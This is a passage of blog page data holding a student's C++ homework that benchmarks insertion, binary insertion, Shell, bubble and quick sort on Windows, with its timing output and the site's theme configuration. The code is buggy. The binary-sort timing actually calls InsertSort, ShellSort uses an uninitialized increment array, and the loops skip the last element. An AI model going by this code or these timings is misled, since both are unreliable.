class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第1次测试, 数量级:10</span><br><span class=\"line\"></span><br><span class=\"line\">插入排序:0.00037758ms</span><br><span class=\"line\">二分排序:0.00037758ms</span><br><span class=\"line\">希尔排序:0.00302064ms</span><br><span class=\"line\">冒泡排序:0.00037758ms</span><br><span class=\"line\">快速排序:0.000755161ms</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">第2次测试, 数量级:100</span><br><span class=\"line\"></span><br><span class=\"line\">插入排序:0.00717403ms</span><br><span class=\"line\">二分排序:0.00830677ms</span><br><span class=\"line\">希尔排序:0.0256755ms</span><br><span class=\"line\">冒泡排序:0.027941ms</span><br><span class=\"line\">快速排序:0.00717403ms</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">第3次测试, 数量级:1000</span><br><span class=\"line\"></span><br><span class=\"line\">插入排序:0.65548ms</span><br><span class=\"line\">二分排序:0.746099ms</span><br><span class=\"line\">希尔排序:0.288849ms</span><br><span class=\"line\">冒泡排序:2.10841ms</span><br><span class=\"line\">快速排序:0.0887314ms</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">第4次测试, 数量级:10000</span><br><span class=\"line\"></span><br><span class=\"line\">插入排序:81.4585ms</span><br><span class=\"line\">二分排序:73.2691ms</span><br><span class=\"line\">希尔排序:4.76695ms</span><br><span class=\"line\">冒泡排序:357.605ms</span><br><span class=\"line\">快速排序:1.55676ms</span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":4787,"excerpt":"<h1 id=\"各种排序时间复杂度比较\"><a href=\"#各种排序时间复杂度比较\" class=\"headerlink\" title=\"各种排序时间复杂度比较\"></a>各种排序时间复杂度比较</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br>","more":"<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdlib&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> Decimal=<span class=\"number\">1000</span>;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> *elem;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> length;</span><br><span class=\"line\">&#125;SqList;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">InsertSort</span><span class=\"params\">(SqList L)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,j;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">2</span>;i&lt;L.length;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(L.elem[i]&lt;L.elem[i<span class=\"number\">-1</span>])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tL.elem[<span class=\"number\">0</span>]=L.elem[i];</span><br><span class=\"line\">\t\t\tL.elem[i]=L.elem[i<span class=\"number\">-1</span>];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j=i<span class=\"number\">-2</span>;L.elem[<span class=\"number\">0</span>]&lt;L.elem[j];j--)</span><br><span class=\"line\">\t\t\tL.elem[j+<span class=\"number\">1</span>]=L.elem[j];</span><br><span class=\"line\">\t\tL.elem[j+<span class=\"number\">1</span>]=L.elem[<span class=\"number\">0</span>];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">BInsertSort</span><span class=\"params\">(SqList L)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,j,high,low,m;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">2</span>;i&lt;L.length;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tL.elem[<span class=\"number\">0</span>]=L.elem[i];</span><br><span class=\"line\">\t\tlow=<span class=\"number\">1</span>;high=i<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(low&lt;=high)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tm=(low+high)/<span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(L.elem[<span class=\"number\">0</span>]&lt;L.elem[m])high=m<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> low=m+<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j=i<span class=\"number\">-1</span>;j&gt;=high+<span class=\"number\">1</span>;j--)</span><br><span class=\"line\">\t\t\tL.elem[j+<span class=\"number\">1</span>]=L.elem[j];</span><br><span class=\"line\">\t\tL.elem[high+<span class=\"number\">1</span>]=L.elem[<span class=\"number\">0</span>];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ShellInsert</span><span class=\"params\">(SqList &amp;L,<span class=\"keyword\">int</span> dk)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,j;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=dk+<span class=\"number\">1</span>;i&lt;L.length;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(L.elem[i]&lt;L.elem[i-dk])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tL.elem[<span class=\"number\">0</span>]=L.elem[i];</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span>(j=i-dk;j&gt;<span class=\"number\">0</span>&amp;&amp;L.elem[<span class=\"number\">0</span>]&lt;L.elem[j];j-=dk)</span><br><span class=\"line\">\t\t\t\tL.elem[j+dk]=L.elem[j];</span><br><span class=\"line\">\t\t\tL.elem[j+dk]=L.elem[<span class=\"number\">0</span>];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ShellSort</span><span class=\"params\">(SqList &amp;L,<span class=\"keyword\">int</span> dt[],<span class=\"keyword\">int</span> t)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> k;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(k=<span class=\"number\">0</span>;k&lt;t;k++)</span><br><span class=\"line\">\tShellInsert(L,dt[k]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">BubbleSort</span><span class=\"params\">(SqList &amp;L)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m=L.length<span class=\"number\">-1</span>,flag=<span class=\"number\">1</span>,t;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>((m&gt;<span class=\"number\">0</span>)&amp;&amp;(flag==<span class=\"number\">1</span>))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tflag=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">1</span>;j&lt;=m;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(L.elem[j]&gt;L.elem[j+<span class=\"number\">1</span>])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tflag=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t\tt=L.elem[j];</span><br><span class=\"line\">\t\t\t\tL.elem[j]=L.elem[j+<span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t\t\tL.elem[j+<span class=\"number\">1</span>]=t;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t--m;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">Partition</span><span class=\"params\">(SqList &amp;L,<span class=\"keyword\">int</span> low,<span class=\"keyword\">int</span> high)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tL.elem[<span class=\"number\">0</span>]=L.elem[low];</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> privotkey=L.elem[low];</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(low&lt;high)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(low&lt;high&amp;&amp;L.elem[high]&gt;=privotkey)--high;</span><br><span class=\"line\">\t\t\tL.elem[low]=L.elem[high];</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(low&lt;high&amp;&amp;L.elem[low]&lt;=privotkey)++low;</span><br><span class=\"line\">\t\t\tL.elem[high]=L.elem[low];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tL.elem[low]=L.elem[<span class=\"number\">0</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> low;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">QSort</span><span class=\"params\">(SqList &amp;L,<span class=\"keyword\">int</span> low,<span class=\"keyword\">int</span> high)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span>  pivotloc;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(low&lt;high)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpivotloc=Partition(L,low,high);</span><br><span class=\"line\">\t\tQSort(L,low,pivotloc<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t\tQSort(L,pivotloc+<span class=\"number\">1</span>,high);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">QuickSort</span><span class=\"params\">(SqList &amp;L)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tQSort(L,<span class=\"number\">1</span>,L.length);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Test</span><span class=\"params\">(SqList &amp;L)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;L.length;i++)</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;L.elem[i]&lt;&lt;<span class=\"string\">&quot; &quot;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> k=<span class=\"number\">1</span>,MAXN=<span class=\"number\">1</span>;</span><br><span class=\"line\">\tSqList L;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> run_time,dpFreq;</span><br><span class=\"line\">\t_LARGE_INTEGER time_start; <span class=\"comment\">//开始时间</span></span><br><span class=\"line\">\t_LARGE_INTEGER time_over; <span class=\"comment\">//结束时间</span></span><br><span class=\"line\">\tLARGE_INTEGER f;</span><br><span class=\"line\">\tQueryPerformanceFrequency(&amp;f);</span><br><span class=\"line\">\tdpFreq=(<span class=\"keyword\">double</span>)f.QuadPart; <span class=\"comment\">//计时器频率</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"literal\">true</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tMAXN*=<span class=\"number\">10</span>;</span><br><span class=\"line\">\t\tL.elem=<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[MAXN+<span class=\"number\">1</span>];</span><br><span class=\"line\">\t\tL.length=MAXN;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;第&quot;</span>&lt;&lt;k++&lt;&lt;<span class=\"string\">&quot;次测试, 数量级:&quot;</span>&lt;&lt;MAXN&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\tsrand((<span class=\"keyword\">unsigned</span>)time(<span class=\"literal\">NULL</span>));</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;L.length;i++)</span><br><span class=\"line\">\t\t\tL.elem[i]=rand();</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_start);  <span class=\"comment\">//计时开始</span></span><br><span class=\"line\">\t\tInsertSort(L);</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_over);  <span class=\"comment\">//计时结束</span></span><br><span class=\"line\">\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;插入排序:&quot;</span>&lt;&lt;run_time&lt;&lt;<span class=\"string\">&quot;ms&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;L.length;i++)</span><br><span class=\"line\">\t\t\tL.elem[i]=rand();</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_start);</span><br><span class=\"line\">\t\tInsertSort(L);</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_over);</span><br><span class=\"line\">\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;二分排序:&quot;</span>&lt;&lt;run_time&lt;&lt;<span class=\"string\">&quot;ms&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> dt[<span class=\"number\">100001</span>],t=<span class=\"number\">100</span>;</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_start);</span><br><span class=\"line\">\t\tShellSort(L,dt,t);</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_over);</span><br><span class=\"line\">\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;希尔排序:&quot;</span>&lt;&lt;run_time&lt;&lt;<span 